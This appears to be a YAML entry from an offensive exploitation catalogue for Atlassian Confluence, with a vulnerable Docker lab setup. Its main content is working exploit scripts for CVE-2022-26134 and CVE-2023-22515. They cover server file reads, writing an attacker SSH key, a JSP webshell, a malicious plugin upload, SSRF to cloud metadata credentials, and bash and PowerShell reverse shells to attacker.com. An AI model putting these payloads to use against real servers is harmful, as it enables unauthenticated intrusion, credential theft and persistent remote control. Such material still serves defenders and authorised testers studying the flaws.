---
comment: |
  Atlassian Confluence Server and Data Center is a Java-based team wiki. Two critical
  unauthenticated vulnerabilities have CISA KEV status:

  1. CVE-2022-26134 (CVSS 9.8, CISA KEV): OGNL expression injection via the HTTP request
     path. Any HTTP request to a crafted URL evaluates a Java OGNL expression as the
     Confluence process user, with full access to the Java runtime and HTTP response objects.
     Affects Confluence Server and Data Center 1.3.0 through 7.18.0.

  2. CVE-2023-22515 (CVSS 10.0, CISA KEV): Broken access control on the /setup endpoint
     allows an unauthenticated attacker to create a new administrator account.
     Affects Confluence Data Center and Server 8.0.0 through 8.5.1.

  Confluence does not expose a built-in scripting console. Admin-level RCE requires
  installing a malicious plugin (JAR/OBR) via Administration > Manage apps > Upload app.
docker:
  compose: "services:\n  confluence:\n    image: atlassian/confluence:7.13.6\n   \
    \ ports:\n      - \"8090:8090\"\n      - \"8091:8091\"\n    environment:\n   \
    \   ATL_JDBC_URL: jdbc:postgresql://db:5432/confluencedb\n      ATL_JDBC_USER:\
    \ confluence\n      ATL_JDBC_PASSWORD: confluence\n      ATL_DB_TYPE: postgresql\n\
    \    depends_on:\n      - db\n  db:\n    image: postgres:13\n    environment:\n\
    \      POSTGRES_DB: confluencedb\n      POSTGRES_USER: confluence\n      POSTGRES_PASSWORD:\
    \ confluence\n"
  note: "Starts Confluence 7.13.6 (vulnerable to CVE-2022-26134 unauthenticated OGNL\
    \ RCE).\nAccess at `http://localhost:8090`. Complete the setup wizard: select\
    \ PostgreSQL, host `db`,\ndatabase `confluencedb`, user `confluence`, password\
    \ `confluence`.\nRun `docker compose up -d && sleep 60` to allow PostgreSQL to\
    \ initialise.\nThe OGNL injection is active immediately \u2014 setup completion\
    \ is not required.\n"
functions:
  file-read:
  - code: |
      # CVE-2022-26134: read a server-side file via OGNL BufferedReader
      python3 - <<'EOF'
      import urllib.parse, requests

      TARGET = "http://victim.com:8090"
      FILE   = "/etc/passwd"
      # Key targets:
      # /var/atlassian/application-data/confluence/confluence.cfg.xml  (DB credentials)
      # /opt/atlassian/confluence/confluence/WEB-INF/web.xml
      # /proc/1/cmdline  (reveals installation paths)

      ognl = (
          "${(#a=@org.apache.struts2.ServletActionContext@getResponse())."
          "(#b=new java.io.BufferedReader(new java.io.FileReader('" + FILE + "')))."
          "(#c=new java.lang.StringBuilder())."
          "(#d=#b.readLine())."
          "(#c.append(#d))."
          "(#a.getWriter().println(#c))}"
      )
      r = requests.get(TARGET + "/" + urllib.parse.quote(ognl, safe=""))
      print(r.text.strip())
      EOF
    comment: |
      CVE-2022-26134: reads a server-side file via OGNL BufferedReader (returns first line).
      Extend with a readLine() loop for multi-line files.
      confluence.cfg.xml contains the database JDBC URL, username, and password in plaintext.
      /proc/1/cmdline reveals the Java classpath and exact Confluence installation paths.
    contexts:
      unauthenticated:
    version: |
      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
  file-write:
  - code: |
      # CVE-2022-26134: write arbitrary content to the filesystem via OGNL FileWriter
      python3 - <<'EOF'
      import urllib.parse, requests

      TARGET  = "http://victim.com:8090"
      OUTFILE = "/root/.ssh/authorized_keys"
      CONTENT = "ssh-ed25519 AAAA...attacker_pubkey... attacker"

      ognl = (
          "${(#a=@org.apache.struts2.ServletActionContext@getResponse())."
          "(#b=new java.io.FileWriter('" + OUTFILE + "'))."
          "(#b.write('" + CONTENT + "'))."
          "(#b.close())."
          "(#a.getWriter().print('ok'))}"
      )
      r = requests.get(TARGET + "/" + urllib.parse.quote(ognl, safe=""))
      print(r.text.strip())
      EOF
    comment: "CVE-2022-26134: writes arbitrary content to the filesystem via OGNL\
      \ FileWriter.\nUseful targets:\n- /opt/atlassian/confluence/confluence/<name>.jsp\
      \  (JSP webshell \u2014 see webshell entry)\n- /root/.ssh/authorized_keys  (SSH\
      \ persistence when Confluence runs as root)\n- /etc/cron.d/backdoor  (persistent\
      \ execution via system cron)\nWritability depends on the Confluence process\
      \ user's filesystem permissions.\n"
    contexts:
      unauthenticated:
    version: |
      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
  rce:
  - code: "# CVE-2022-26134: OGNL injection via HTTP path \u2014 execute command and\
      \ read output inline\npython3 - <<'EOF'\nimport urllib.parse, requests\n\nTARGET\
      \  = \"http://victim.com:8090\"\nCOMMAND = \"id\"\n\nognl = (\n    \"${(#a=@org.apache.struts2.ServletActionContext@getResponse()).\"\
      \n    \"(#b=@java.lang.Runtime@getRuntime().exec(new String[]{\\\"/bin/sh\\\"\
      ,\\\"-c\\\",\\\"\"\n    + COMMAND + \"\\\"})).\"\n    \"(#c=new java.io.InputStreamReader(#b.getInputStream())).\"\
      \n    \"(#d=new java.io.BufferedReader(#c)).\"\n    \"(#e=#d.readLine()).\"\n\
      \    \"(#a.getWriter().println(#e))}\"\n)\nr = requests.get(TARGET + \"/\" +\
      \ urllib.parse.quote(ognl, safe=\"\"))\nprint(r.text.strip())\nEOF\n"
    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2022-26134:\
      \ Confluence evaluates OGNL expressions embedded in HTTP request paths\nvia\
      \ an unpatched action dispatcher. No authentication or request body required\
      \ \u2014\na single GET request delivers and executes the payload.\nCommand output\
      \ is written directly to the HTTP response body via the response writer.\nFor\
      \ multi-word commands use /bin/sh -c as shown above.\nRef: https://www.exploit-db.com/exploits/51511\n\
      Metasploit: use exploit/multi/http/atlassian_confluence_ognl_injection\nnuclei:\
      \ CVE-2022-26134\n"
    contexts:
      unauthenticated:
    version: |
      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
  - code: |
      # CVE-2023-22515: create an administrator account via the exposed setup endpoint
      curl -s -X POST "http://victim.com:8090/setup/setupadministrator.action" \
        -d "username=attacker&fullName=Attacker&email=attacker@evil.com&password=P%40ss0rd1&confirm=P%40ss0rd1&setup-next-button=Next"

      # Verify admin access:
      curl -s -c /tmp/cf.jar -X POST "http://victim.com:8090/dologin.action" \
        -d "os_username=attacker&os_password=P%40ss0rd1&login=Log+In&os_destination=%2Fadmin%2Fconsole.action" \
        -L | grep -i "System Administration"
    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2023-22515:\
      \ Confluence Data Center / Server 8.0.0\u20138.5.1 does not restrict\naccess\
      \ to the first-run setup endpoint after installation. A single POST to\n/setup/setupadministrator.action\
      \ creates a new system-administrator account.\nAfter gaining admin access, install\
      \ a malicious plugin for RCE (see webshell entry)\nor combine with the OGNL\
      \ file-write entry to drop a JSP webshell.\nRef: https://confluence.atlassian.com/security/cve-2023-22515-frequently-asked-questions-1295682188.html\n\
      nuclei: CVE-2023-22515\n"
    contexts:
      unauthenticated:
    version: |
      8.0.0 - 8.5.1
  - code: |
      # Install a malicious Confluence plugin JAR containing an RCE servlet
      # Build with the Atlassian Plugin SDK (atlas-create-confluence-plugin / atlas-package)
      # Minimal plugin requires atlassian-plugin.xml + a servlet calling Runtime.exec()
      curl -u "admin:admin" -X POST \
        "http://victim.com:8090/rest/plugins/1.0/?os_authType=basic" \
        -H "X-Atlassian-Token: no-check" \
        -F "plugin=@shell-plugin-1.0.jar;type=application/java-archive"

      # Access the deployed servlet (path matches the servlet-key in atlassian-plugin.xml):
      curl "http://victim.com:8090/plugins/servlet/shell?c=id"
    comment: |
      Confluence does not have a built-in scripting console. Admin-level RCE requires
      a plugin (JAR) that registers a servlet calling Runtime.getRuntime().exec().
      The plugin is hot-deployed — no server restart required.
      Combine with CVE-2023-22515 to first elevate to admin on unpatched 8.x targets.
    contexts:
      admin:
  reverse-shell:
  - blind: true
    code: "# CVE-2022-26134: spawn a reverse bash shell via OGNL Runtime.exec()\n\
      python3 - <<'EOF'\nimport urllib.parse, requests\n\nTARGET = \"http://victim.com:8090\"\
      \nLHOST  = \"attacker.com\"\nLPORT  = \"12345\"\n\ncmd  = f\"bash -i >& /dev/tcp/{LHOST}/{LPORT}\
      \ 0>&1\"\nognl = (\n    \"${@java.lang.Runtime@getRuntime().exec(\"\n    \"\
      new String[]{\\\"/bin/bash\\\",\\\"-c\\\",\\\"\" + cmd + \"\\\"}\"\n    \")}\"\
      \n)\nrequests.get(TARGET + \"/\" + urllib.parse.quote(ognl, safe=\"\"))\nprint(f\"\
      [*] Payload sent \u2014 check listener on {LHOST}:{LPORT}\")\nEOF\n"
    comment: "CVE-2022-26134: spawns a reverse bash shell via OGNL Runtime.exec()\
      \ in the URL path.\nThe exec() call is fire-and-forget \u2014 the HTTP response\
      \ returns immediately.\nThe shell runs as the Confluence process user (commonly\
      \ confluence or daemon).\n"
    contexts:
      unauthenticated:
    listener: tcp-server
    platform: linux
    tty: false
    version: |
      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
  - blind: true
    code: "# CVE-2022-26134: PowerShell reverse shell for Windows Confluence Server\n\
      python3 - <<'EOF'\nimport urllib.parse, requests\n\nTARGET = \"http://victim.com:8090\"\
      \nLHOST  = \"attacker.com\"\nLPORT  = \"12345\"\n\nps = (\n    f'$c=New-Object\
      \ Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});'\n    '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'\n\
      \    'while(($i=$s.Read($b,0,$b.Length))-ne 0){'\n    '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'\n\
      \    '$r=(iex $d 2>&1|Out-String);'\n    '$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}'\n\
      )\nognl = (\n    \"${@java.lang.Runtime@getRuntime().exec(\"\n    \"new String[]{\\\
      \"powershell\\\",\\\"-NoP\\\",\\\"-NonI\\\",\\\"-W\\\",\\\"Hidden\\\",\"\n \
      \   \"\\\"-Exec\\\",\\\"Bypass\\\",\\\"-Command\\\",\\\"\" + ps + \"\\\"}\"\n\
      \    \")}\"\n)\nrequests.get(TARGET + \"/\" + urllib.parse.quote(ognl, safe=\"\
      \"))\nprint(f\"[*] Payload sent \u2014 check listener on {LHOST}:{LPORT}\")\n\
      EOF\n"
    comment: |
      CVE-2022-26134: PowerShell reverse shell for Windows Confluence Server deployments.
      Uses the same OGNL Runtime.exec() injection as the Linux variant.
    contexts:
      unauthenticated:
    listener: tcp-server
    platform: windows
    tty: false
    version: |
      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
  ssrf:
  - code: |
      # CVE-2022-26134: probe internal services via OGNL java.net.URL.openStream()
      python3 - <<'EOF'
      import urllib.parse, requests

      TARGET       = "http://victim.com:8090"
      INTERNAL_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

      ognl = (
          "${(#a=@org.apache.struts2.ServletActionContext@getResponse())."
          "(#b=new java.net.URL('" + INTERNAL_URL + "').openStream())."
          "(#c=new java.io.InputStreamReader(#b))."
          "(#d=new java.io.BufferedReader(#c))."
          "(#e=#d.readLine())."
          "(#a.getWriter().println(#e))}"
      )
      r = requests.get(TARGET + "/" + urllib.parse.quote(ognl, safe=""))
      print(r.text.strip())
      EOF

      # Cloud metadata endpoints:
      # AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
      # GCP:        http://metadata.google.internal/computeMetadata/v1/
      # Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
    comment: |
      CVE-2022-26134: java.net.URL.openStream() within OGNL makes outbound HTTP requests
      from the Confluence host, reaching internal services and cloud metadata endpoints
      unreachable from the attacker. The first line of the response is returned inline.
      On patched instances with editor access, the {iframe} or {html} macros (if enabled)
      can trigger server-side fetching of attacker-controlled URLs.
    contexts:
      unauthenticated:
    version: |
      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
  webshell:
  - code: |
      # CVE-2022-26134: write a JSP webshell to the Confluence web root via OGNL FileWriter
      python3 - <<'EOF'
      import urllib.parse, requests

      TARGET     = "http://victim.com:8090"
      # Common paths (use file-read to check /proc/1/cmdline for exact location):
      # Linux package: /opt/atlassian/confluence/confluence/
      # Docker image:  /opt/atlassian/confluence/confluence/
      SHELL_PATH = "/opt/atlassian/confluence/confluence/shell.jsp"
      SHELL_CODE = (
          '<%@ page import="java.io.*" %>'
          '<%String c=request.getParameter("c");if(c!=null){'
          'String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);'
          'out.print(new String(p.getInputStream().readAllBytes()));'
          '}%>'
      )
      ognl = (
          "${(#a=@org.apache.struts2.ServletActionContext@getResponse())."
          "(#b=new java.io.FileWriter('" + SHELL_PATH + "'))."
          "(#b.write('" + SHELL_CODE.replace("'", "\\'") + "'))."
          "(#b.close())."
          "(#a.getWriter().print('ok'))}"
      )
      r = requests.get(TARGET + "/" + urllib.parse.quote(ognl, safe=""))
      print(r.text.strip())
      print(f"[*] Access at: {TARGET}/shell.jsp?c=id")
      EOF
    comment: |
      CVE-2022-26134: writes a persistent JSP webshell to the Confluence web root via
      OGNL FileWriter. The JSP is served directly by Confluence's embedded Tomcat.
      Access at: http://victim.com:8090/shell.jsp?c=id
      Confirm the exact web root with the file-read entry targeting /proc/1/cmdline.
    contexts:
      unauthenticated:
    version: |
      1.3.0 - 7.18.0 (before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1)
...
